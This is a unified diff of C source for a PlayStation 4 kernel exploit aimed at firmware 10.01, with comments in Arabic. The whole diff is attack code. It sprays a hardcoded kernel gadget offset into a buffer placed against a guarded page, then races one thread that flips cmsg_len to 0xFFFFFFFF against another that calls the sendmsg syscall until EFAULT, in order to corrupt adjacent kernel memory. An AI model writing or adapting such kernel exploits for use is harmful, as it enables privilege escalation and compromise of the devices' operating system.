@@ -1,100 +1,94 @@
 #include <ps4.h>
 
+// --- إعدادات الذاكرة لـ PS4 (16KB Page) ---
+#define PS4_PAGE_SIZE 0x4000
+#define OVERFLOW_SIZE 256 
+#define NCMSG         14   // عدد الهياكل لملء MLEN (224 بايت)
+
 // --- الإزاحات لنسخة 10.01 ---
 #define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
-#define OFF_JMP_RSI_3B           0x049C5D 
-#define OFF_LEA_RSP_RSI_20_RET   0x72B346 
-#define OFF_POP_RBX_R14_RBP_JMP  0x345741 
 
-// --- إعدادات الذاكرة لـ PS4 ---
-#define PS4_PAGE_SIZE 0x4000
-#define CONTROL_LEN   256
-#define SPRAY_COUNT   256
-
-struct msghdr {
-    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
-    void *msg_control; uint32_t msg_controllen; int msg_flags;
-};
-struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
-
-uint8_t *mapped_payload;
-struct cmsghdr *cmsg;
-int global_sock;
-int spray_socks[SPRAY_COUNT];
+uint8_t *BaseArea;
+struct cmsghdr *ControlBuf;
+size_t ControlBufLen;
 volatile int stop_race = 0;
+uint64_t n_tries = 0;
 
-// --- 1. تهيئة الـ Heap (Grooming) ---
-void prepare_heap() {
-    for(int i = 0; i < SPRAY_COUNT; i++) {
-        spray_socks[i] = syscall(97, 2, 2, 0); 
-        if(spray_socks[i] > 0) {
-            uint8_t dummy[0x50];
-            memset(dummy, 0, 0x50);
-            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
-        }
+// --- 1. بناء البفر الجراحي (Alignment & Protection) ---
+void BuildPrecisionBuffer(uint64_t kbase) {
+    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
+    // حساب الحجم الكلي مع ضمان المحاذاة على حدود الصفحة
+    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
+
+    // حجز صفحتين: واحدة للبفر وواحدة للحماية (Unmapped)
+    BaseArea = mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+    if (BaseArea == MAP_FAILED) {
+        printf_debug("[!] mmap failed\n");
+        return;
     }
-    for(int i = 0; i < SPRAY_COUNT; i += 2) {
-        if(spray_socks[i] > 0) {
-            syscall(6, spray_socks[i]); 
-            spray_socks[i] = -1;
-        }
+
+    // تفعيل الحماية على الصفحة الثانية فوراً (تسبب EFAULT)
+    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);
+
+    // موازنة البفر (Offset) ليكون الـ OVERFLOW_SIZE في نهاية الصفحة تماماً
+    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
+    
+    ControlBuf = (struct cmsghdr *)aligned_base;
+    ControlBufLen = cmsgsize;
+
+    // تهيئة الـ cmsghdr بقيم شرعية
+    for (int i = 0; i < NCMSG; i++) {
+        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
+        ControlBuf[i].cmsg_level = 0;
+        ControlBuf[i].cmsg_type = 7; // IP_RETOPTS
+    }
+
+    // وضع الـ Gadget (السم) في منطقة التجاوز
+    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
+    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
+    
+    for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
+        *(uintptr_t *)(overflow_ptr + i) = trigger;
     }
 }
 
-// --- 2. إعداد البفر بدقة (Unmapped Page Trick) ---
-void setup_precision_buffer(uint64_t kbase) {
-    // حجز صفحتين متتاليتين بحجم PS4
-    uint8_t *pages = mmap(NULL, PS4_PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-    
-    // حماية الصفحة الثانية (تسبب EFAULT)
-    mprotect(pages + PS4_PAGE_SIZE, PS4_PAGE_SIZE, PROT_NONE);
-
-    // وضع البفر في نهاية الصفحة الأولى تماماً
-    mapped_payload = pages + PS4_PAGE_SIZE - CONTROL_LEN;
-    
-    cmsg = (struct cmsghdr *)mapped_payload;
-    memset(mapped_payload, 0, CONTROL_LEN);
-    
-    cmsg->cmsg_len = 0x50;
-    cmsg->cmsg_level = 0;
-    cmsg->cmsg_type = 7;
-
-    uintptr_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET;
-    uintptr_t step4 = kbase + OFF_POP_RBX_R14_RBP_JMP;
-    uintptr_t val_target = 0xDEADC0DE;
-
-    // ملء منطقة الـ Overflow حتى نهاية الصفحة
-    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
-        *(uintptr_t *)(mapped_payload + i) = step1;
-    }
-
-    // وضع القيم التي تريد رؤيتها في السجلات عند الإزاحات المحددة
-    *(uintptr_t *)(mapped_payload + 0x60) = step4;
-    *(uintptr_t *)(mapped_payload + 0x68) = val_target; 
-}
-
-// --- 3. خيوط السباق المعدلة ---
-void *sendmsg_thread(void *arg) {
-    struct msghdr msg = {0};
-    msg.msg_control = mapped_payload;
-    msg.msg_controllen = CONTROL_LEN;
-
-    while(!stop_race) {
-        // إذا أعاد النظام EFAULT (قيمة 14)، فهذا يعني النجاح
-        int ret = syscall(28, global_sock, &msg, 0);
-        if (ret == -1 && errno == 14) { 
-            stop_race = 1;
-        }
+// --- 2. خيط التخريب (The Wrecker) ---
+void *wrecker_thread(void *arg) {
+    while (!stop_race) {
+        // العودة للحجم الصحيح
+        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
+        for(volatile int i=0; i<40; i++); // تأخير نانوي ضبط التوقيت
+        
+        // التغيير للحجم الضخم (Race Condition)
+        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
+        for(volatile int i=0; i<40; i++);
     }
     return NULL;
 }
 
-void *race_thread(void *arg) {
-    while(!stop_race) {
-        cmsg->cmsg_len = 0x50;
-        // تأخير ميكروي لضبط التوقيت مع copyin
-        for(volatile int i=0; i<100; i++); 
-        cmsg->cmsg_len = 0xFFFF;
+// --- 3. خيط التنفيذ (The Executor) ---
+void *executor_thread(void *arg) {
+    struct msghdr msg = {0};
+    msg.msg_control = ControlBuf;
+    msg.msg_controllen = ControlBufLen;
+    const int bad_fd = 666; // نستخدم FD غير موجود لزيادة الاستقرار
+
+    printf_debug("[+] Executor started, racing...\n");
+
+    while (!stop_race) {
+        n_tries++;
+        int ret = syscall(28, bad_fd, &msg, 0); // sendmsg syscall
+        
+        // التحقق من الخطأ: 14 هو EFAULT (يعني أننا دهسنا الذاكرة ووصلنا للصفحة المحمية)
+        if (ret == -1 && errno == 14) { 
+            stop_race = 1;
+            printf_debug("[***] SUCCESS! EFAULT detected at try: %llu\n", n_tries);
+            // في هذه اللحظة، النواة دهست الـ mbuf المجاور بقيمنا وتوقفت "بسلام"
+        }
+        
+        if (n_tries % 10000 == 0) {
+            printf_debug("[.] Tries: %llu\n", n_tries);
+        }
     }
     return NULL;
 }
@@ -102,20 +96,25 @@ void *race_thread(void *arg) {
 int _main(struct thread *td) {
     initKernel();
     initLibc();
+    initSysUtil(); // تهيئة خدمات النظام للعرض والتفاعل
+
+    printf_debug("--- [PS4 Kernel Exploit Precision Tool] ---\n");
 
     uint64_t kbase = get_kernel_base();
-    
-    prepare_heap();
-    setup_precision_buffer(kbase);
+    printf_debug("[+] Kernel Base: 0x%llx\n", kbase);
 
-    global_sock = syscall(97, 2, 2, 0);
+    BuildPrecisionBuffer(kbase);
+    printf_debug("[+] Buffer ready at: %p\n", ControlBuf);
 
-    ScePthread t1, t2;
-    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
-    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");
+    ScePthread wrid, exid;
+    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
+    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
 
-    scePthreadJoin(t1, NULL);
-    scePthreadJoin(t2, NULL);
+    // ننتظر حتى ينجح السباق
+    scePthreadJoin(exid, NULL);
+    stop_race = 1; // إيقاف الـ wrecker بعد النجاح
+    scePthreadJoin(wrid, NULL);
 
+    printf_debug("[+] Exploit finished successfully.\n");
     return 0;
 }
